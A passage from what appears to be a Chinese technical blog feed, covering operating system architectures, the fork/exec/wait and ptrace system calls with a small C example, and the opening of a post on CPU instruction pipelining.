&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;第5层: 用户程序
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;第4层: 输入/输出管理
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;第3层: 操作员-进程通信
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;第2层: 内存管理
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;第1层: 进程调度
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;第0层: 硬件
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;优点&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;模块化设计，便于调试和维护&lt;/li&gt;
&lt;li&gt;层次清晰，易于理解&lt;/li&gt;
&lt;li&gt;易于验证系统正确性&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;缺点&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;性能开销大(多层调用)&lt;/li&gt;
&lt;li&gt;层次划分困难&lt;/li&gt;
&lt;li&gt;严格分层限制系统灵活性&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;微内核方法microkernel-approach&#34;&gt;微内核方法(Microkernel Approach)
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;基本概念&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;将尽可能多的功能从内核移到用户空间&lt;/li&gt;
&lt;li&gt;内核只保留最基本的功能&lt;/li&gt;
&lt;li&gt;其他系统服务作为用户级进程运行&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;微内核核心功能&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;进程间通信(IPC)&lt;/li&gt;
&lt;li&gt;基本进程管理&lt;/li&gt;
&lt;li&gt;低级内存管理&lt;/li&gt;
&lt;li&gt;基本I/O和中断管理&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;用户空间服务&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;文件系统服务器&lt;/li&gt;
&lt;li&gt;网络协议栈&lt;/li&gt;
&lt;li&gt;设备驱动程序&lt;/li&gt;
&lt;li&gt;虚拟内存管理器&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;优点&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;系统稳定性高(服务崩溃不影响内核)&lt;/li&gt;
&lt;li&gt;安全性好(服务运行在隔离的地址空间)&lt;/li&gt;
&lt;li&gt;易于扩展和维护&lt;/li&gt;
&lt;li&gt;支持分布式系统&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;缺点&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;IPC开销大，性能较低&lt;/li&gt;
&lt;li&gt;系统调用开销增加&lt;/li&gt;
&lt;li&gt;设计和实现复杂&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;模块化方法modular-approach&#34;&gt;模块化方法(Modular Approach)
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;基本概念&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;结合单体内核和微内核的优点&lt;/li&gt;
&lt;li&gt;内核提供核心服务&lt;/li&gt;
&lt;li&gt;其他功能通过可装载模块实现&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;特征&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;模块可以动态加载和卸载&lt;/li&gt;
&lt;li&gt;模块运行在内核空间&lt;/li&gt;
&lt;li&gt;通过定义良好的接口通信&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Linux模块示例&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;文件系统模块(ext4, ntfs)&lt;/li&gt;
&lt;li&gt;网络协议模块(TCP/IP)&lt;/li&gt;
&lt;li&gt;设备驱动模块&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;优点&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;灵活性高&lt;/li&gt;
&lt;li&gt;内存使用效率高&lt;/li&gt;
&lt;li&gt;易于维护和扩展&lt;/li&gt;
&lt;li&gt;性能好(避免用户空间切换)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;缺点&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;模块错误可能影响整个内核&lt;/li&gt;
&lt;li&gt;接口设计需要谨慎&lt;/li&gt;
&lt;li&gt;依赖关系管理复杂&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;混合系统架构&#34;&gt;混合系统架构
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;基本概念&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;结合多种架构方法的优点&lt;/li&gt;
&lt;li&gt;针对不同功能采用最适合的架构&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;现代操作系统实例&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Windows NT&lt;/strong&gt;：混合微内核架构
&lt;ul&gt;
&lt;li&gt;内核模式：HAL、内核、执行体&lt;/li&gt;
&lt;li&gt;用户模式：子系统、应用程序&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;macOS&lt;/strong&gt;：基于Mach微内核的混合架构
&lt;ul&gt;
&lt;li&gt;Mach微内核 + BSD层 + I/O Kit&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Linux&lt;/strong&gt;：模块化单体内核
&lt;ul&gt;
&lt;li&gt;单体内核 + 可装载模块&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;系统调用实例&#34;&gt;系统调用实例
&lt;/h3&gt;&lt;h4 id=&#34;进程管理系统调用示例&#34;&gt;进程管理系统调用示例
&lt;/h4&gt;&lt;h5 id=&#34;fork系统调用&#34;&gt;fork系统调用
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;基本概念&lt;/strong&gt;：创建新进程的方式&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;特殊之处&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;新创建的进程是调用进程的完全副本&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;返回两次&lt;/strong&gt;：在父进程和子进程中分别返回&lt;/li&gt;
&lt;li&gt;新进程拥有自己的内存地址空间&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;返回值&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;在父进程中：返回子进程的PID&lt;/li&gt;
&lt;li&gt;在子进程中：返回0&lt;/li&gt;
&lt;li&gt;出错时：返回-1&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;fork--wait组合&#34;&gt;fork + wait组合
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;wait系统调用&lt;/strong&gt;：父进程等待子进程执行完毕&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;用途&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;避免僵尸进程&lt;/li&gt;
&lt;li&gt;获取子进程退出状态&lt;/li&gt;
&lt;li&gt;进程同步控制&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;典型使用模式&lt;/strong&gt;：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;pid_t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pid&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;fork&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pid&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// 子进程代码
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nf&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pid&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// 父进程代码
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nf&#34;&gt;wait&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// 等待子进程结束
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;fork--wait--exec组合&#34;&gt;fork + wait + exec组合
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;exec系统调用特点&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;用于运行与调用程序不同的程序&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;exec永不返回&lt;/strong&gt;(成功时)&lt;/li&gt;
&lt;li&gt;完全替换当前进程映像&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;为什么分离fork和exec&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;构建UNIX shell的基础&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;允许在fork后、exec前进行特殊操作&lt;/li&gt;
&lt;li&gt;提供更大的灵活性&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Shell工作原理&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;Shell是一个用户程序&lt;/li&gt;
&lt;li&gt;等待用户输入&lt;/li&gt;
&lt;li&gt;执行命令：fork创建子进程 → exec加载新程序 → wait等待完成&lt;/li&gt;
&lt;li&gt;分离设计使shell功能更强大&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;调试相关系统调用&#34;&gt;调试相关系统调用
&lt;/h4&gt;&lt;h5 id=&#34;ptrace系统调用&#34;&gt;ptrace系统调用
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;基本概念&lt;/strong&gt;：进程追踪系统调用&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;主要功能&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;一个进程可以控制另一个进程的执行&lt;/li&gt;
&lt;li&gt;检查和修改被追踪进程的内存和寄存器&lt;/li&gt;
&lt;li&gt;实现断点调试功能&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;应用场景&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;调试器实现&lt;/strong&gt;：gdb、strace等工具的基础&lt;/li&gt;
&lt;li&gt;进程监控和分析&lt;/li&gt;
&lt;li&gt;安全分析工具&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;调试器debugger工作原理&#34;&gt;调试器(Debugger)工作原理
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;定义&lt;/strong&gt;：用于测试和调试其他程序的计算机程序&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;基本操作&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;附加到进程&lt;/strong&gt;(Attaching to a process)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;基本控制&lt;/strong&gt;(Basic Control)：暂停、继续、单步执行&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;设置断点&lt;/strong&gt;(Setting a breakpoint)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;命中断点&lt;/strong&gt;(Hitting a breakpoint)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ptrace在调试中的应用&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;通过ptrace系统调用实现进程控制&lt;/li&gt;
&lt;li&gt;监控被调试程序的每个系统调用&lt;/li&gt;
&lt;li&gt;提供程序执行状态的实时查看&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;系统调用实践要点&#34;&gt;系统调用实践要点
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;进程创建模式&lt;/strong&gt;：fork + exec是UNIX系统进程创建的标准模式&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Shell实现&lt;/strong&gt;：所有UNIX shell都基于fork/exec/wait三个系统调用&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;调试工具&lt;/strong&gt;：现代调试器和追踪工具都依赖ptrace系统调用&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;手册参考&lt;/strong&gt;：使用man page查看详细的系统调用文档和使用方法&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>流水线与在处理器中的应用</title>
        <link>https://example.com/p/%E6%B5%81%E6%B0%B4%E7%BA%BF%E4%B8%8E%E5%9C%A8%E5%A4%84%E7%90%86%E5%99%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/</link>
        <pubDate>Fri, 25 Jul 2025 20:31:00 +0800</pubDate>
        
        <guid>https://example.com/p/%E6%B5%81%E6%B0%B4%E7%BA%BF%E4%B8%8E%E5%9C%A8%E5%A4%84%E7%90%86%E5%99%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/</guid>
        <description>&lt;h1 id=&#34;流水线cpu&#34;&gt;流水线CPU
&lt;/h1&gt;&lt;h2 id=&#34;流水线核心概念&#34;&gt;流水线核心概念
&lt;/h2&gt;&lt;h3 id=&#34;理念&#34;&gt;理念
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;将指令执行划分为多个时间均衡的子阶段，使得多条不同指令再不同阶段并行处理&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;处理方式&#34;&gt;处理方式
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;可以想象一下，假设在洗衣时，需要经过洗涤（30min）$\rightarrow$ 烘干 （40min）$\rightarrow$ 折叠（20min），现在有4人需要洗衣服务，如果全部依次处理（单周期CPU），那么耗时是6h，即处理每个人的服务需要90min（1.5h），依次执行，共计耗时6h。如果使用流水线处理，可以在执行上一个人的烘干任务时执行下一个人的洗涤任务。
  &lt;p align=&#34;center&#34;&gt;
      &lt;img src=&#34;https://example.com/images/pipeline_ex1.png&#34; alt=&#34;洗衣&#34; width=&#34;80%&#34;&gt;
  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;可以看到通过通过流水线处理将总耗时缩减到了3.5h&lt;/li&gt;
&lt;li&gt;与洗衣类似，指令执行也可以分为三个阶段IF(Instucction Fetch), ID(Instruction Decode), Ex(Execution)
  &lt;p align=&#34;center&#34;&gt;
      &lt;img src=&#34;https://example.com/images/pipeline2.png&#34; alt=&#34;指令构成&#34; width=&#34;70%&#34;&gt;
  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;在串行处理中，与上面的洗衣类似，下一条指令在上一个指令的三个阶段全部结束后才开始
  &lt;p align=&#34;center&#34;&gt;
      &lt;img src=&#34;https://example.com/images/pipeline3.png&#34; alt=&#34;串行执行&#34; width=&#34;70%&#34;&gt;
  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;此时的运行时间为$6Δt$ (这里为了方便演示，假设各个阶段的处理时间相同)&lt;/li&gt;
&lt;li&gt;可以发现与洗衣类似，后一条指令并不需要等待前一条执行完毕，而是只需要对应的模块”空出来“就可以执行
  &lt;p align=&#34;center&#34;&gt;
      &lt;img src=&#34;https://example.com/images/pipeline4.png&#34; alt=&#34;单重叠&#34; width=&#34;50%&#34;&gt;
  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;此时的运行时间为$5Δt$&lt;/li&gt;
&lt;li&gt;可以发现运行时间可以被进一步缩短，即增加重叠部分
  &lt;p align=&#34;center&#34;&gt;
      &lt;img src=&#34;https://example.com/images/pipeline5.png&#34; alt=&#34;单重叠&#34; width=&#34;40%&#34;&gt;
  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;此时的运行时间为$4Δt$&lt;/li&gt;
&lt;li&gt;以上两种重叠方式分别被称为 &lt;strong&gt;单重叠(Single overlapping)&lt;/strong&gt; 和 &lt;strong&gt;双重叠(Twice overlapping)&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;重叠方式比较&#34;&gt;重叠方式比较
&lt;/h3&gt;&lt;h4 id=&#34;单重叠&#34;&gt;单重叠
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;优点
&lt;ul&gt;
&lt;li&gt;相较串行运行时间缩短近$\frac{1}{3}$（对大量指令）&lt;/li&gt;
&lt;li&gt;功能单元利用率显著提升&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;缺点
&lt;ul&gt;
&lt;li&gt;需要额外硬件支持&lt;/li&gt;
&lt;li&gt;控制过程复杂化&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;双重叠&#34;&gt;双重叠
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;优点
&lt;ul&gt;
&lt;li&gt;相较串行运行时间缩短近$\frac{2}{3}$（对大量指令）&lt;/li&gt;
&lt;li&gt;功能单元利用率进一步显著提升&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;缺点
&lt;ul&gt;
&lt;li&gt;需要大量额外硬件支持&lt;/li&gt;
&lt;li&gt;需要物理分离的fetch, decode和execution单元&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;注-双重叠面临的问题和需要的硬件支持&#34;&gt;注： 双重叠面临的问题和需要的硬件支持
&lt;/h5&gt;&lt;h6 id=&#34;核心问题内存访问冲突&#34;&gt;核心问题：内存访问冲突
&lt;/h6&gt;&lt;ul&gt;
&lt;li&gt;在双重叠中如果多条指令同时访问内存，会引发冲突
&lt;ul&gt;
&lt;li&gt;冲突场景：&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;实践场景双重叠还原为单重叠&#34;&gt;实践场景：双重叠还原为单重叠
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;上面的讲解都是基于三个阶段耗时相等的假设的，但是在实际CPU场景中，三个阶段的运行时间并不相等，一般IF阶段耗时最少，如果IF阶段耗时很短可以忽略，那么双重叠在优化上就约等与单重叠了
  &lt;p align=&#34;center&#34;&gt;
      &lt;img src=&#34;https://example.com/images/pipeline6.png&#34; alt=&#34;忽略IF&#34; width=&#34;50%&#34;&gt;
  &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;阶段不等长重叠中的资源浪费和冲突问题&#34;&gt;阶段不等长——重叠中的资源浪费和冲突问题
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;在考虑到应用场景中各阶段不等长后，可以进一步考虑潜在的问题
&lt;ul&gt;
&lt;li&gt;如果ID &amp;lt; EX
&lt;p align=&#34;center&#34;&gt;
    &lt;img src=&#34;https://example.com/images/pipeline7.png&#34; alt=&#34;忽略IF&#34; width=&#34;70%&#34;&gt;
&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;可以看到此时一条指令的EX阶段在时间上与下一条指令的EX阶段发生了重叠，这被称之为资源冲突&lt;/li&gt;
&lt;li&gt;如果ID &amp;gt; EX
 &lt;p align=&#34;center&#34;&gt;
    &lt;img src=&#34;https://example.com/images/pipeline8.png&#34; alt=&#34;忽略IF&#34; width=&#34;50%&#34;&gt;
&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;可以看到此时的时间轴上存在未执行指令的部分，这被称为资源浪费&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;注：为什么是这种执行方式？
&lt;ul&gt;
&lt;li&gt;所有流水线阶段在&lt;strong&gt;同一时钟边沿同步推进&lt;/strong&gt;，即IF始终是在每个时钟周期开始时触发的。ID &amp;gt; EX的情况下的实际过程是IF(K+1)在执行完毕后等待到ID(K)执行完毕，开启下一个时钟周期才开始执行ID(K+1)和IF(K+2)。这个现象被称为&lt;strong&gt;阻塞(Block)&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;流水线概念&#34;&gt;流水线概念
&lt;/h3&gt;&lt;h4 id=&#34;核心解释&#34;&gt;核心解释
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;指令分解：将单条指令的执行划分成&lt;strong&gt;m个子阶段&lt;/strong&gt;，要求m&amp;gt;5。经典设计为五级流水线。m被称为&lt;strong&gt;流水线深度&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;时间均等：要求每个子阶段耗时&lt;strong&gt;严格相等&lt;/strong&gt;($Δt_{stage}$)，由全局时钟周期$T_c$统一控制。若阶段耗时不等，以&lt;strong&gt;最慢阶段&lt;/strong&gt;为基准设定($T_c$)&lt;/li&gt;
&lt;li&gt;错位重叠：m条相邻指令在同一时间&lt;strong&gt;并行处理不同阶段&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;重叠方式参考上面的双重叠，实现全阶段并行&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;特征&#34;&gt;特征
&lt;/h3&gt;&lt;h4 id=&#34;结构特征&#34;&gt;结构特征
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;阶段划分：每阶段由专属功能单元实现（如IF/ID/EX）&lt;/li&gt;
&lt;li&gt;时间均衡：最长阶段决定整体速度
&lt;ul&gt;
&lt;li&gt;这是流水线高效运行的关键，如果某个阶段时间比其他阶段长，这个阶段就会成为&lt;strong&gt;瓶颈(Bottleneck)&lt;/strong&gt;，如上面所演示的那样导致阻塞&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;流水线寄存器：缓存阶段见数据，隔离各阶段操作
&lt;ul&gt;
&lt;li&gt;传递数据：在时钟边沿将前一个阶段在本时钟周期内处理完成的结果捕获并储存起来&lt;/li&gt;
&lt;li&gt;数据保持：在下一个时钟周期这个数据会被提供给下一个阶段作为输入，确保数据在正确的时间被后续阶段使用&lt;/li&gt;
&lt;li&gt;阶段隔离：当前一个阶段在下一个时钟周期开始处理新任务时，后一个阶段使用的是寄存器中保存的、前一个阶段上一个周期的结果。没有这些寄存器，前一阶段的新输出会立即冲掉后一阶段还在处理的输入，导致数据混乱和错误。 它确保了每个阶段在一个时钟周期内可以独立地处理分配给它的那份工作（数据）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;适用场景大量重复的顺序工作&#34;&gt;适用场景：大量重复的顺序工作
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;大量：从上面的示例可以发现，在不考虑“开头”和“结尾”的情况下，当m=3时，运行时间应当是串行时间的$\frac{1}{3}$.但实际可以看到，存在开头和结尾的额外开销，这被称为&lt;strong&gt;流水线启动&lt;/strong&gt;和&lt;strong&gt;排空&lt;/strong&gt;，在稍后会涉及。同时不难发现，当处理条数更多时，运行时间更接近$\frac{1}{3}$，即-处理大量的指令时节省的时间可以稀释启动和排空开销&lt;/li&gt;
&lt;li&gt;重复：任务的执行流程（分解成的阶段）是相似的。上面的演示中的阶段都是完全相同的，就是一种理想状态&lt;/li&gt;
&lt;li&gt;顺序：任务见最好是顺序执行的，或相关性较低。如果任务间有较强的依赖性就容易导致阻塞&lt;/li&gt;
&lt;li&gt;持续输入：保持流水线处于忙碌状态，避免空闲导致效率下降&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;时间参数启动时间与排空时间&#34;&gt;时间参数：启动时间与排空时间
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;启动时间/首次延迟&lt;/strong&gt;：从第一个任务进入流水线到离开的总时间&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;排空时间/排空延迟&lt;/strong&gt;：从最后一个任务进入到所有流水线任务结束的总时间&lt;/li&gt;
